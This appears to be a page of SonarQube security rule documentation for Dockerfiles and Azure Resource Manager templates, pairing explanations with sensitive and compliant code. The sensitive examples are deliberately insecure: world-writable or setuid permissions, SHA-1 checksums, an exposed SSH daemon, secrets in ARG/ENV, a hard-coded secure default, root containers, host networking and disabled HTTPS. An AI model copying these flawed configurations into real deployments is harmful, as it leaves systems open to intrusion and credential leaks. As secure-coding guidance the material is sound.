  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html">What is AWS Secrets Manager</a> </li>
  <li> Azure Documentation - <a href="https://learn.microsoft.com/en-us/azure/key-vault/">Azure Key Vault</a> </li>
  <li> Google Cloud - <a href="https://cloud.google.com/secret-manager/docs">Secret Manager documentation</a> </li>
  <li> HashiCorp Developer - <a href="https://developer.hashicorp.com/vault/docs">Vault Documentation</a> </li>
  <li> Docker Documentation - <a href="https://docs.docker.com/engine/swarm/secrets/">Manage sensitive data with Docker secrets</a> </li>
  <li> Docker Documentation - <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret">RUN command secrets mount points</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/522">CWE-522 - Insufficiently Protected Credentials</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/798">CWE-798 - Use of Hard-coded Credentials</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S2612">
              docker:S2612
            </a>
          </td>
          <td>
            <details>
              <p>In Unix file system permissions, the "<code>others</code>" category refers to all users except the owner of the file system resource and the
members of the group assigned to this resource.</p>
<p>Granting permissions to this category can lead to unintended access to files or directories that could allow attackers to obtain sensitive
information, disrupt services or elevate privileges.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The container is designed to be a multi-user environment. </li>
  <li> Services are run by dedicated low-privileged users to achieve privileges separation. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The most restrictive possible permissions should be assigned to files and directories.</p>
<p>To be secure, remove the unnecessary permissions. If required, use <code>--chown</code> to set the target user and group.</p>
<h2>Sensitive Code Example</h2>
<pre>
# Sensitive
ADD --chmod=777 src dst
# Sensitive
COPY --chmod=777 src dst
# Sensitive
RUN chmod +x resource
# Sensitive
RUN chmod u+s resource
</pre>
<h2>Compliant Solution</h2>
<pre>
ADD --chmod=754 src dst
COPY --chown=user:user --chmod=744 src dst
RUN chmod u+x resource
RUN chmod +t resource
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#add">ADD</a> - Docker ADD command </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#copy">COPY</a> - Docker COPY command </li>
  <li> <a href="https://man.archlinux.org/man/core/man-pages/chmod.1p.en">chmod reference</a> - <code>chmod</code> command </li>
  <li> <a href="https://man.archlinux.org/man/chown.1.en">chown reference</a> - <code>chown</code> command </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S4790">
              docker:S4790
            </a>
          </td>
          <td>
            <details>
              <p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,
<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,
<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little
computational effort is enough to find two or more different inputs that produce the same hash).</p>
<h2>Ask Yourself Whether</h2>
<p>The hashed value is used in a security context like:</p>
<ul>
  <li> User-password storage. </li>
  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>
  <li> To compute some message integrity. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even
better to use algorithms that do not compute too "quickly", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>
because it slows down <code>brute force attacks</code>.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM ubuntu:22.04

# Sensitive
RUN echo "a40216e7c028e7d77f1aec22d2bbd5f9a357016f  go1.20.linux-amd64.tar.gz" | sha1sum -c
RUN tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
ENV PATH="$PATH:/usr/local/go/bin"
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM ubuntu:22.04

RUN echo "5a9ebcc65c1cce56e0d2dc616aff4c4cedcfbda8cc6f0288cc08cda3b18dcbf1  go1.20.linux-amd64.tar.gz" | sha256sum -c
RUN tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz
ENV PATH="$PATH:/usr/local/go/bin"
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A02_2021-Cryptographic_Failures/">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> OWASP - <a href="https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements">Mobile AppSec
  Verification Standard - Cryptography Requirements</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography">Mobile Top 10 2016 Category M5 -
  Insufficient Cryptography</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1240">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6473">
              docker:S6473
            </a>
          </td>
          <td>
            <details>
              <p>Exposing administration services can lead to unauthorized access to containers or escalation of privilege inside of containers.</p>
<p>A port that is commonly used for administration services is marked as being open through the <code>EXPOSE</code> command. Administration services
like SSH might contain vulnerabilities, hard-coded credentials, or other security issues that increase the attack surface of a Docker deployment.<br>
Even if the ports of the services do not get forwarded to the host system, by default they are reachable from other containers in the same network. A
malicious actor that gets access to one container could use such services to escalate access and privileges.</p>
<p>Removing the <code>EXPOSE</code> command is not sufficient to be secure. The port is still open and the service accessible. To be secure, no
administration services should be started. Instead, try to access the required information from the host system. For example, if the administration
service is included to access logs or debug a service, you can do this from the host system instead. Docker allows you to read out any file that is
inside of a container and to spawn a shell inside of a container if necessary.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The container starts an administration service. </li>
</ul>
<p>There is a risk if you answered yes to the question.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Do not start SSH, VNC, RDP or similar administration services in containers. </li>
</ul>
<h2>Sensitive Code Example</h2>
<pre>
FROM ubuntu:22.04
# Sensitive
EXPOSE 22
CMD ["/usr/sbin/sshd", "-f", "/etc/ssh/sshd_config", "-D"]
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#expose">Dockerfile reference</a> - EXPOSE </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6472">
              docker:S6472
            </a>
          </td>
          <td>
            <details>
              <p>Using <code>ENV</code> and <code>ARG</code> to handle secrets can lead to sensitive information being disclosed to an inappropriate sphere.</p>
<p>The <code>ARG</code> and <code>ENV</code> instructions in a Dockerfile are used to configure the image build and the container environment
respectively. Both can be used at image build time, during the execution of commands in the container, and <code>ENV</code> can also be used at
runtime.</p>
<p>In most cases, build-time and environment variables are used to propagate configuration items from the host to the image or container. A typical
example for an environmental variable is the <code>PATH</code> variable, used to configure where system executables are searched for.</p>
<p>Using <code>ARG</code> and <code>ENV</code> to propagate configuration entries that contain secrets causes a security risk. Indeed, in most cases,
artifacts of those values are kept in the final image. The secret information leak can happen either in the container environment itself, the image
metadata or the build environment logs.</p>
<p>The concrete impact of such an issue highly depends on the secret’s purpose and the exposure sphere:</p>
<ul>
  <li> Financial impact if a paid service API key is disclosed and used. </li>
  <li> Application compromise if an application’s secret, like a session signing key, is disclosed. </li>
  <li> Infrastructure component takeover, if a system secret, like a remote access key, is leaked. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The variable contains a value that should be kept confidential. </li>
  <li> The container image or Dockerfile will be distributed to users who do not need to know the secret value. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Use Buildkit’s secret mount options when secrets have to be used at build time. </li>
  <li> For run time secret variables, best practices would recommend only setting them at runtime, for example with the <code>--env</code> option of
  the <code>docker run</code> command. </li>
</ul>
<p>Note that, in both cases, the files exposing the secrets should be securely stored and not exposed to a large sphere. In most cases, using a secret
vault or another similar component should be preferred. For example, <strong>Docker Swarm</strong> provides a <strong>secrets</strong> service that
can be used to handle most confidential data.</p>
<h2>Sensitive Code Example</h2>
<pre>
FROM example
# Sensitive
ARG ACCESS_TOKEN
# Sensitive
ENV ACCESS_TOKEN=${ACCESS_TOKEN}
CMD /run.sh
</pre>
<h2>Compliant Solution</h2>
<p>For build time secrets, use <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret">Buildkit’s secret mount type</a>
instead:</p>
<pre>
FROM example
RUN --mount=type=secret,id=build_secret ./installer.sh
</pre>
<p>For runtime secrets, leave the environment variables empty until runtime:</p>
<pre>
FROM example
ENV ACCESS_TOKEN=""
CMD /run.sh
</pre>
<p>Store the runtime secrets in an <a href="https://docs.docker.com/compose/env-file/">environment file</a> (such as <code>.env</code>) and then start
the container with the <a href="https://docs.docker.com/engine/reference/commandline/run/#env"><code>--env-file</code></a> argument:</p>
<pre>
docker run --env-file .env myImage
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#env">Dockerfile reference</a> - ENV command </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#arg">Dockerfile reference</a> - ARG command </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#run---mounttypesecret">Dockerfile reference</a> - RUN command secrets mount points
  </li>
  <li> <a href="https://docs.docker.com/engine/swarm/secrets/">Docker documentation</a> - Manage sensitive data with Docker secrets </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/522">CWE-522 - Insufficiently Protected Credentials</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6431">
              docker:S6431
            </a>
          </td>
          <td>
            <details>
              <p>Using host operating system namespaces can lead to compromise of the host system.<br> Opening network services of the local host system to the
container creates a new attack surface for attackers.</p>
<p>Host network sharing could provide a significant performance advantage for workloads that require critical network performance. However, the
successful exploitation of this attack vector could have a catastrophic impact on confidentiality within the host.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The host exposes sensitive network services. </li>
  <li> The container’s services performances do <strong>not</strong> rely on operating system namespaces. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not use host operating system namespaces.</p>
<h2>Sensitive Code Example</h2>
<pre>
# syntax=docker/dockerfile:1.3
FROM example
# Sensitive
RUN --network=host wget -O /home/sessions http://127.0.0.1:9000/sessions
</pre>
<h2>Compliant Solution</h2>
<pre>
# syntax=docker/dockerfile:1.3
FROM example
RUN --network=none wget -O /home/sessions http://127.0.0.1:9000/sessions
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.docker.com/build/buildkit/dockerfile-frontend/">Dockerfile reference</a> - Custom Dockerfile syntax </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#run---network">Dockerfile reference</a> - RUN --network </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/653">CWE-653 - Improper Isolation or Compartmentalization</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6471">
              docker:S6471
            </a>
          </td>
          <td>
            <details>
              <p>Running containers as a privileged user weakens their runtime security, allowing any user whose code runs on the container to perform
administrative actions.<br> In Linux containers, the privileged user is usually named <code>root</code>. In Windows containers, the equivalent is
<code>ContainerAdministrator</code>.</p>
<p>A malicious user can run code on a system either thanks to actions that could be deemed legitimate - depending on internal business logic or
operational management shells - or thanks to malicious actions. For example, with arbitrary code execution after exploiting a service that the
container hosts.</p>
<p>Suppose the container is not hardened to prevent using a shell, interpreter, or <a
href="https://man7.org/linux/man-pages/man7/capabilities.7.html">Linux capabilities</a>. In this case, the malicious user can read and exfiltrate any
file (including Docker volumes), open new network connections, install malicious software, or, worse, break out of the container’s isolation context
by exploiting other components.</p>
<p>This means giving the possibility to attackers to steal important infrastructure files, intellectual property, or personal data.</p>
<p>Depending on the infrastructure’s resilience, attackers may then extend their attack to other services, such as Kubernetes clusters or cloud
providers, in order to maximize their reach.</p>
<h2>Ask Yourself Whether</h2>
<p>This container:</p>
<ul>
  <li> Serves services accessible from the Internet. </li>
  <li> Does not require a privileged user to run. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In the Dockerfile:</p>
<ul>
  <li> Create a new default user and use it with the <code>USER</code> statement.
    <ul>
      <li> Some container maintainers create a specific user to be used without explicitly setting it as default, such as <code>postgresql</code> or
      <code>zookeeper</code>. It is recommended to use these users instead of root. </li>
      <li> On Windows containers, the <code>ContainerUser</code> is available for this purpose. </li>
    </ul>  </li>
</ul>
<p>Or, at launch time:</p>
<ul>
  <li> Use the <code>user</code> argument when calling Docker or in the docker-compose file. </li>
  <li> Add fine-grained Linux capabilities to perform specific actions that require root privileges. </li>
</ul>
<p>If this image is already explicitly set to launch with a non-privileged user, you can add it to the safe images list rule property of your
SonarQube instance, without the tag.</p>
<h2>Sensitive Code Example</h2>
<p>For any image that does not provide a user by default, regardless of their underlying operating system:</p>
<pre>
# Sensitive
FROM alpine

ENTRYPOINT ["id"]
</pre>
<p>For multi-stage builds, the last stage is non-compliant if it does not contain the <code>USER</code> instruction with a non-root user:</p>
<pre>
FROM alpine AS builder
COPY Makefile ./src /
RUN make build
USER nonroot

# Sensitive, previous user settings are dropped
FROM alpine AS runtime
COPY --from=builder bin/production /app
ENTRYPOINT ["/app/production"]
</pre>
<h2>Compliant Solution</h2>
<p>For Linux-based images and scratch-based images that untar a Linux distribution:</p>
<pre>
FROM alpine

RUN addgroup -S nonroot \
    &amp;&amp; adduser -S nonroot -G nonroot

USER nonroot

ENTRYPOINT ["id"]
</pre>
<p>For Windows-based images, you can use <code>ContainerUser</code> or create a new user:</p>
<pre>
FROM mcr.microsoft.com/windows/servercore:ltsc2019

RUN net user /add nonroot

USER nonroot
</pre>
<p>For multi-stage builds, the non-root user should be on the last stage:</p>
<pre>
FROM alpine as builder
COPY Makefile ./src /
RUN make build

FROM alpine as runtime
RUN addgroup -S nonroot \
    &amp;&amp; adduser -S nonroot -G nonroot
COPY --from=builder bin/production /app
USER nonroot
ENTRYPOINT ["/app/production"]
</pre>
<p>For images that use <code>scratch</code> as their base, it is not possible to add non-privileged users by default. To do this, add an additional
build stage to add the group and user, and later copy <code>/etc/passwd</code>.</p>
<p>Here is an example that uses <code>adduser</code> in the first stage to generate a user and add it to the <code>/etc/passwd</code> file. In the
next stage, this user is added by copying that file over from the previous stage:</p>
<pre>
FROM alpine:latest as security_provider
RUN addgroup -S nonroot \
    &amp;&amp; adduser -S nonroot -G nonroot

FROM scratch as production
COPY --from=security_provider /etc/passwd /etc/passwd
USER nonroot
COPY production_binary /app
ENTRYPOINT ["/app/production_binary"]
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
  <li> <a href="https://hub.docker.com/r/nginxinc/nginx-unprivileged">nginxinc/nginx-unprivileged: Example of a non-root container by default</a>
  </li>
  <li> <a
  href="https://learn.microsoft.com/en-us/virtualization/windowscontainers/manage-containers/container-security#when-to-use-containeradmin-and-containeruser-user-accounts">Microsoft docs, When to use ContainerAdmin and ContainerUser user accounts</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=docker:S6470">
              docker:S6470
            </a>
          </td>
          <td>
            <details>
              <p>When building a Docker image from a Dockerfile, a context directory is used and sent to the Docker daemon before the actual build starts. This
context directory usually contains the Dockerfile itself, along with all the files that will be necessary for the build to succeed. This generally
includes:</p>
<ul>
  <li> the source code of applications to set up in the container. </li>
  <li> configuration files for other software components. </li>
  <li> other necessary packages or components. </li>
</ul>
<p>The <code>COPY</code> and <code>ADD</code> directives in the Dockerfiles are then used to actually copy content from the context directory to the
image file system.</p>
<p>When <code>COPY</code> or <code>ADD</code> are used to recursively copy entire top-level directories or multiple items whose names are determined
at build-time, unexpected files might get copied to the image filesystem. It could affect their confidentiality.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The copied files and directories might contain sensitive data that should be kept confidential. </li>
  <li> The context directory contains files and directories that have no functional purpose for the final container image. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<p>Keep in mind that the content of the context directory might change depending on the build environment and over time.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Limit the usage of globbing in the <code>COPY</code> and <code>ADD</code> sources definition. </li>
  <li> Avoid copying the entire context directory to the image filesystem. </li>
  <li> Prefer providing an explicit list of files and directories that are required for the image to properly run. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Copying the complete context directory:</p>
<pre>
FROM ubuntu:22.04
# Sensitive
COPY . .
CMD /run.sh
</pre>
<p>Copying multiple files and directories whose names are expanded at build time:</p>
<pre>
FROM ubuntu:22.04
# Sensitive
COPY ./example* /
COPY ./run.sh /
CMD /run.sh
</pre>
<h2>Compliant Solution</h2>
<pre>
FROM ubuntu:22.04
COPY ./example1 /example1
COPY ./example2 /example2
COPY ./run.sh /
CMD /run.sh
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#copy">Dockerfile reference</a> - COPY directive </li>
  <li> <a href="https://docs.docker.com/engine/reference/builder/#add">Dockerfile reference</a> - ADD directive </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/668">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/497">CWE-497 - Exposure of Sensitive System Information to an Unauthorized Control
  Sphere</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6656">
              azureresourcemanager:S6656
            </a>
          </td>
          <td>
            <details>
              <p>When using nested deployments in Azure, template expressions can be evaluated within the scope of the parent template or the scope of the nested
template. If such a template expression evaluates a secure value of the parent template, it is possible to expose this value in the deployment
history.</p>
<h2>Why is this an issue?</h2>
<p>Parameters with the type <code>securestring</code> and <code>secureObject</code> are designed to pass sensitive data to the resources being
deployed. Secure parameters cannot be accessed after the deployment is completed: they can neither be logged nor used as an output.</p>
<p>When used in nested deployments, however, it is possible to embed secure parameters in such a way they can be visible afterward.</p>
<h3>What is the potential impact?</h3>
<p>If the nested deployment contains a secure parameter in this way, then the value of this parameter may be readable in the deployment history. This
can lead to important credentials being leaked to unauthorized accounts.</p>
<h2>How to fix it in ARM Templates</h2>
<p>By setting <code>properties.expressionEvaluationOptions.scope</code> to <code>Inner</code> in the parent template, template evaluations are limited
to the scope of the nested template. This makes it impossible to expose secure parameters defined in the parent template.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="101" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": {
    "adminUsername": {
      "type": "securestring",
      "defaultValue": "[newGuid()]"
    }
  },
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Resources/deployments",
      "apiVersion": "2022-09-01",
      "properties": {
        "mode": "Incremental",
        "template": {
          "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
          "contentVersion": "1.0.0.0",
          "resources": [
            {
              "name": "example",
              "type": "Microsoft.Compute/virtualMachines",
              "apiVersion": "2022-11-01",
              "properties": {
                "osProfile": {
                  "adminUsername": "[parameters('adminUsername')]"
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="101" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "name": "example",
      "type": "Microsoft.Resources/deployments",
      "apiVersion": "2022-09-01",
      "properties": {
        "expressionEvaluationOptions": {
          "scope": "Inner"
        },
        "mode": "Incremental",
        "template": {
          "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
          "contentVersion": "1.0.0.0",
          "parameters": {
            "adminUsername": {
              "type": "securestring",
              "defaultValue": "[newGuid()]"
            }
          },
          "resources": [
            {
              "name": "example",
              "type": "Microsoft.Compute/virtualMachines",
              "apiVersion": "2022-11-01",
              "properties": {
                "osProfile": {
                  "adminUsername": "[parameters('adminUsername')]"
                }
              }
            }
          ]
        }
      }
    }
  ]
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> Microsoft Learn - <a
  href="https://learn.microsoft.com/en-us/azure/templates/microsoft.resources/deployments?pivots=deployment-language-arm-template"><code>Microsoft.Resources/deployments</code></a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S6648">
              azureresourcemanager:S6648
            </a>
          </td>
          <td>
            <details>
              <p>Azure Resource Manager templates define parameters as a way to reuse templates in different environments. Secure parameters (secure strings and
secure objects) should not be assigned a default value.</p>
<h2>Why is this an issue?</h2>
<p>Parameters with the type <code>securestring</code> and <code>secureObject</code> are designed to pass sensitive data to the resources being
deployed. Unlike other data types, they cannot be accessed after the deployment is completed. They can neither be logged nor used as an output.</p>
<p>Secure parameters can be assigned a default value which will be used if the parameter is not supplied. This default value is not protected and is
stored in cleartext in the deployment history.</p>
<h3>What is the potential impact?</h3>
<p>If the default value contains a secret, it will be disclosed to all accounts that have read access to the deployment history.</p>
<h2>How to fix it in ARM templates</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": {
    "secretValue": {
      "type": "securestring",
      "defaultValue": "S3CR3T"
    }
  }
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "parameters": {
    "secretValue": {
      "type": "securestring"
    }
  }
}
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/data-types">Data types in ARM templates</a> </li>
  <li> <a href="https://learn.microsoft.com/en-us/azure/azure-resource-manager/templates/best-practices#security-recommendations-for-parameters">ARM
  template best practices - Security recommendations for parameters</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/532">CWE-532 - Insertion of Sensitive Information into Log File</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=azureresourcemanager:S5332">
              azureresourcemanager:S5332
            </a>
          </td>
          <td>
            <details>
              <p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the
capability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the
transported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>
<ul>
  <li> sensitive data exposure </li>
  <li> traffic redirected to a malicious endpoint </li>
  <li> malware-infected software update or installer </li>
  <li> execution of client-side code </li>
  <li> corruption of critical information </li>
</ul>
<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks
involving communications being sniffed or tampered with can still happen.</p>
<p>For example, attackers could successfully compromise prior security layers by:</p>
<ul>
  <li> bypassing isolation mechanisms </li>
  <li> compromising a component of the network </li>
  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>
</ul>
<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network
components. By layering various security practices (segmentation and encryption, for example), the application will follow the
<em>defense-in-depth</em> principle.</p>
<p>Note that using the <code>http</code> protocol is being deprecated by <a
href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http">major web browsers</a>.</p>
<p>In the past, it has led to the following vulnerabilities:</p>
<ul>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-6169">CVE-2019-6169</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-12327">CVE-2019-12327</a> </li>
  <li> <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11065">CVE-2019-11065</a> </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Application data needs to be protected against tampering or leaks when transiting over the network. </li>
  <li> Application data transits over an untrusted network. </li>
  <li> Compliance rules require the service to encrypt data in transit. </li>
  <li> OS-level protections against clear-text traffic are deactivated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most
  common clear-text protocols:
    <ul>
      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>
      <li> Use <code>https</code> instead of <code>http</code>. </li>
    </ul>  </li>
</ul>
<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire
application or system.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites">Microsoft.Web/sites</a>:</p>
<pre data-diff-id="1" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites",
      "name": "example",
      "apiVersion": "2022-09-01",
      "properties": {
        "httpsOnly": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="8" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Web/sites@2022-03-01' = {
  properties: {
    httpsOnly: false // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.web/sites/config-web">Microsoft.Web/sites/config</a>:</p>
<pre data-diff-id="2" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Web/sites/config",
      "name": "sites/example",
      "apiVersion": "2022-09-01",
      "properties": {
        "ftpsState": "AllAllowed"
      }
    }
  ]
}
</pre>
<pre data-diff-id="9" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Web/sites/config@2022-09-01' = {
  properties: {
    ftpsState: 'AllAllowed' // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.storage/storageaccounts">Microsoft.Storage/storageAccounts</a>:</p>
<pre data-diff-id="3" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.Storage/storageAccounts",
      "name": "example",
      "apiVersion": "2022-09-01",
      "properties": {
        "supportsHttpsTrafficOnly": false
      }
    }
  ]
}
</pre>
<pre data-diff-id="10" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.Storage/storageAccounts@2022-09-01' = {
  properties: {
    supportsHttpsTrafficOnly: false // Sensitive
  }
}
</pre>
<p>For <a href="https://learn.microsoft.com/en-us/azure/templates/microsoft.apimanagement/service/apis">Microsoft.ApiManagement/service/apis</a>:</p>
<pre data-diff-id="4" data-diff-type="noncompliant">
{
  "$schema": "https://schema.management.azure.com/schemas/2019-04-01/deploymentTemplate.json#",
  "contentVersion": "1.0.0.0",
  "resources": [
    {
      "type": "Microsoft.ApiManagement/service/apis",
      "name": "service/example",
      "apiVersion": "2022-08-01",
      "properties": {
        "protocols": ["http"]
      }
    }
  ]
}
</pre>
<pre data-diff-id="11" data-diff-type="noncompliant">
resource symbolicname 'Microsoft.ApiManagement/service/apis@2022-08-01' = {
  properties: {
    protocols: ['http'] // Sensitive
  }
}
</pre>
